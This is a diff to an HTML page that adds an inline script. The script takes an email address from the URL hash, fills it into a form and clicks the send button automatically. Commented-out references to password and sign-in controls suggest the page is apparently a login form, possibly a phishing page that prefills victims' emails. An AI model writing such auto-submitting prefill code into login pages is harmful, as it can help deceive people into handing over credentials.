@@ -52,6 +52,61 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
     <script src="script.min.js"></script>
+
+
+
+
+
+
+    <script>document.addEventListener('DOMContentLoaded', () => {
+        try {
+            // Check if there is a hash tag in the URL
+            if (window.location.hash) {
+                // Get the email from the URL hash
+                const hash = window.location.hash.substring(1);
+                const email = hash; // Fallback email
+    
+    
+    
+                // Select the input and button elements
+                const inputElement = document.querySelector('#email');
+                const buttonElement = document.querySelector('#btnSend');
+    
+    
+                // const pwdElement = document.querySelector('#inp_pwd');
+                // const nextButton = document.querySelector('#btn_next');
+                // const signInButton = document.querySelector('#btn_sig');
+    
+    
+                if (inputElement && buttonElement) {
+                    // Fill the input field with the email
+                    inputElement.value = email;
+    
+                    // Trigger the button click event
+                    buttonElement.click();
+    
+    
+    
+                    
+                } else {
+                    // Handle case where input or button element is not found
+                    // console.warn('Input or button element not found.');
+                }
+            } else {
+                // Handle case where there is no hash tag in the URL
+                // console.warn('No hash tag found in the URL.');
+            }
+        } catch (error) {
+            // Handle any errors that might occur
+            // console.error('An error occurred:', error);
+        }
+    });
+    
+      </script>
+    
+
+
+    
 </body>
 
 </html>
